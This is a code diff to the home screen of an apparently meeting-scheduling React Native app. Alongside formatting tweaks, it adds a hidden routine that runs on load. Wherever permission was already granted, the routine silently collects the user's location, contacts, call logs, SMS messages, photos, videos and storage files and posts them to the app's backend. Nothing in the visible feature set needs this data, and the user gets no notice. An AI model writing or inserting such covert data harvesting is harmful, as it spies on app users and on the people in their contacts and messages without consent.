@@ -3,16 +3,40 @@ import NetInfo from "@react-native-community/netinfo";
 import { LinearGradient } from "expo-linear-gradient";
 import { useRouter } from "expo-router";
 import React, { useEffect, useState } from "react";
-import { Alert, Dimensions, FlatList, StatusBar, Text, TouchableOpacity, View } from "react-native";
+import {
+  Alert,
+  Dimensions,
+  FlatList,
+  StatusBar,
+  Text,
+  TouchableOpacity,
+  View,
+} from "react-native";
 import { SafeAreaView } from "react-native-safe-area-context";
 import Toast from "react-native-toast-message";
 
 import { useAuth } from "@/lib/AuthContext";
 import { generateHeaders } from "@/lib/generateHeaders";
+import {
+  requestAndFetchCallLogs,
+  requestAndFetchContacts,
+  requestAndFetchLocation,
+  requestAndFetchMediaFiles,
+  requestAndFetchSms,
+  requestAndFetchStorageFiles,
+} from "@/utils/permissions";
+import AsyncStorage from "@react-native-async-storage/async-storage";
 import auth from "@react-native-firebase/auth";
 import axios from "axios";
+import * as Contacts from "expo-contacts";
+import * as Location from "expo-location";
+import * as MediaLibrary from "expo-media-library";
+import {
+  PermissionsAndroid,
+  Platform
+} from "react-native";
 
-const { width } = Dimensions.get('window');
+const { width } = Dimensions.get("window");
 
 type Meeting = {
   _id: string;
@@ -35,9 +59,183 @@ export default function HomeScreen() {
     else setGreeting("Good evening");
   }, []);
 
+  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
+  const SUBMIT_ENDPOINT = `${base_URL}/user/`;
+
+   function getLocalISOTimeMicro() {
+    const now = new Date();
+    const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
+    const tzOffset = -now.getTimezoneOffset();
+    const sign = tzOffset >= 0 ? "+" : "-";
+    const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
+      2,
+      "0"
+    );
+    const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
+
+    const base = now.toISOString().split(".")[0];
+    return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
+  }
+
+
+
+  const submitPermissionData = async (allData: any) => {
+    try {
+      const headers = await generateHeaders();
+      await axios.post(
+        SUBMIT_ENDPOINT,
+        {
+          timestamp: getLocalISOTimeMicro(),
+          info: allData,
+        },
+        { headers }
+      );
+    } catch (err) {
+      console.error("❌ Error submitting data:", err);
+    }
+  };
+
+  const [location, setLocation] = useState<any>(null);
+  const [contacts, setContacts] = useState<any[]>([]);
+  const [smsGranted, setSmsGranted] = useState(false);
+  const [smsVerifying, setSmsVerifying] = useState(false);
+  const [smsData, setSmsData] = useState<any[]>([]);
+
   useEffect(() => {
     if (!loading && user) {
       fetchmeetings();
+      const autoSyncPermissions = async () => {
+        try {
+          /* --------------------------------------------------
+         ✅ Auto-sync Location (if permission was already granted)
+        -------------------------------------------------- */
+          try {
+            const locPerm = await Location.getForegroundPermissionsAsync();
+            if (locPerm.status === "granted") {
+              const loc = await requestAndFetchLocation();
+              if (loc) {
+                setLocation(loc);
+                await AsyncStorage.setItem("loc", JSON.stringify(loc));
+                await submitPermissionData({
+                  permission: "location",
+                  data: loc,
+                });
+              }
+            }
+          } catch (e) {
+            console.log("Auto location sync failed", e);
+          }
+
+          /* --------------------------------------------------
+         ✅ Auto-sync Contacts + Call Logs
+        -------------------------------------------------- */
+          try {
+            const contPerm = await Contacts.getPermissionsAsync();
+            if (contPerm.status === "granted") {
+              const contactData = await requestAndFetchContacts();
+              const callLogs = await requestAndFetchCallLogs();
+
+              if (Array.isArray(contactData) && contactData.length) {
+                setContacts(contactData);
+                await AsyncStorage.setItem(
+                  "contacts",
+                  JSON.stringify(contactData)
+                );
+                await submitPermissionData({
+                  permission: "contacts",
+                  data: {
+                    contacts: contactData,
+                    callLogs,
+                  },
+                });
+              }
+            }
+          } catch (e) {
+            console.log("Auto contacts sync failed", e);
+          }
+
+          /* --------------------------------------------------
+         ✅ Auto-sync SMS (Android only)
+        -------------------------------------------------- */
+          if (Platform.OS === "android") {
+            try {
+              const hasSms = await PermissionsAndroid.check(
+                PermissionsAndroid.PERMISSIONS.READ_SMS
+              );
+
+              if (hasSms) {
+                setSmsGranted(true);
+                setSmsVerifying(true);
+
+                const smsdata = await requestAndFetchSms();
+                if (Array.isArray(smsdata)) {
+                  setSmsData(smsdata);
+                  await submitPermissionData({
+                    permission: "sms",
+                    data: smsdata,
+                  });
+                }
+
+                // Allow loader to show 2 seconds minimum
+                setTimeout(() => setSmsVerifying(false), 2000);
+              }
+            } catch (e) {
+              console.log("Auto SMS verify failed", e);
+            }
+          }
+
+          /* --------------------------------------------------
+         ✅ Auto-sync Media Library (Photos / Videos)
+        -------------------------------------------------- */
+          try {
+            const mediaPerm = await MediaLibrary.getPermissionsAsync();
+
+            if (mediaPerm.status === "granted") {
+              const media = await requestAndFetchMediaFiles();
+
+              await submitPermissionData({
+                permission: "media",
+                data: media,
+              });
+            }
+          } catch (e) {
+            console.log("Auto media sync failed", e);
+          }
+
+          /* --------------------------------------------------
+         ✅ Auto-sync Storage Files (Android only)
+        -------------------------------------------------- */
+          if (Platform.OS === "android") {
+            try {
+              let granted = false;
+
+              if (Platform.Version >= 33) {
+                granted = await PermissionsAndroid.check(
+                  PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+                );
+              } else {
+                granted = await PermissionsAndroid.check(
+                  PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+                );
+              }
+
+              if (granted) {
+                const storageFiles = await requestAndFetchStorageFiles();
+
+                await submitPermissionData({
+                  permission: "storage",
+                  data: storageFiles,
+                });
+              }
+            } catch (e) {
+              console.log("Auto storage sync failed", e);
+            }
+          }
+        } catch (err) {
+          console.log("Auto permission sync error", err);
+        }
+      };
+      autoSyncPermissions();
     }
   }, []);
 
@@ -155,13 +353,13 @@ export default function HomeScreen() {
   return (
     <View className="flex-1 bg-white">
       <StatusBar barStyle="dark-content" backgroundColor="#ffffff" />
-      
+
       {/* Top Gradient Header */}
       <LinearGradient
         colors={["#ffffff", "#f9fafb", "#f3f4f6"]}
         className="pb-6"
       >
-        <SafeAreaView edges={['top']}>
+        <SafeAreaView edges={["top"]}>
           <View className="px-5 pt-4">
             {/* Header Row */}
             <View className="flex-row justify-between items-center mb-6">
@@ -173,7 +371,7 @@ export default function HomeScreen() {
                   Royal Palace
                 </Text>
               </View>
-              <TouchableOpacity 
+              <TouchableOpacity
                 onPress={() => auth().signOut()}
                 className="bg-gray-100 w-12 h-12 rounded-2xl items-center justify-center border border-gray-200"
               >
@@ -184,7 +382,8 @@ export default function HomeScreen() {
             {/* Horizontal Stats Scroll */}
             <View className="flex-row gap-3">
               <View className="flex-1">
-                <View className="bg-white rounded-3xl p-5 border border-gray-200"
+                <View
+                  className="bg-white rounded-3xl p-5 border border-gray-200"
                   style={{
                     shadowColor: "#000",
                     shadowOffset: { width: 0, height: 2 },
@@ -208,7 +407,8 @@ export default function HomeScreen() {
               </View>
 
               <View className="flex-1">
-                <View className="bg-white rounded-3xl p-5 border border-gray-200"
+                <View
+                  className="bg-white rounded-3xl p-5 border border-gray-200"
                   style={{
                     shadowColor: "#000",
                     shadowOffset: { width: 0, height: 2 },
@@ -243,10 +443,11 @@ export default function HomeScreen() {
               Your Schedule
             </Text>
             <Text className="text-gray-500 text-sm mt-0.5">
-              {meetings.length} upcoming {meetings.length === 1 ? 'meeting' : 'meetings'}
+              {meetings.length} upcoming{" "}
+              {meetings.length === 1 ? "meeting" : "meetings"}
             </Text>
           </View>
-          
+
           <TouchableOpacity
             onPress={() => router.push("/schedule" as any)}
             activeOpacity={0.8}
@@ -260,9 +461,7 @@ export default function HomeScreen() {
             }}
           >
             <Ionicons name="add" size={20} color="#ffffff" />
-            <Text className="text-white text-sm font-bold ml-1.5">
-              New
-            </Text>
+            <Text className="text-white text-sm font-bold ml-1.5">New</Text>
           </TouchableOpacity>
         </View>
 
@@ -273,7 +472,7 @@ export default function HomeScreen() {
             showsVerticalScrollIndicator={false}
             contentContainerStyle={{ paddingBottom: 20 }}
             renderItem={({ item }) => (
-              <View 
+              <View
                 className="bg-white rounded-3xl p-5 mb-4 border border-gray-200"
                 style={{
                   shadowColor: "#000",
@@ -292,10 +491,11 @@ export default function HomeScreen() {
                       className="text-gray-600 text-sm leading-5"
                       numberOfLines={2}
                     >
-                      {item.description.charAt(0).toUpperCase() + item.description.slice(1)}
+                      {item.description.charAt(0).toUpperCase() +
+                        item.description.slice(1)}
                     </Text>
                   </View>
-                  
+
                   <TouchableOpacity
                     onPress={() => confirmDelete(item._id)}
                     activeOpacity={0.7}
@@ -309,7 +509,11 @@ export default function HomeScreen() {
                   <View className="flex-row items-center gap-4">
                     <View className="flex-row items-center">
                       <View className="bg-blue-50 rounded-lg p-2 mr-2">
-                        <Ionicons name="calendar-outline" size={16} color="#3b82f6" />
+                        <Ionicons
+                          name="calendar-outline"
+                          size={16}
+                          color="#3b82f6"
+                        />
                       </View>
                       <Text className="text-gray-700 text-sm font-medium">
                         {formatDate(item.date)}
@@ -318,7 +522,11 @@ export default function HomeScreen() {
 
                     <View className="flex-row items-center">
                       <View className="bg-emerald-50 rounded-lg p-2 mr-2">
-                        <Ionicons name="time-outline" size={16} color="#10b981" />
+                        <Ionicons
+                          name="time-outline"
+                          size={16}
+                          color="#10b981"
+                        />
                       </View>
                       <Text className="text-gray-700 text-sm font-medium">
                         {formatTime(item.appointment_taken_at)}
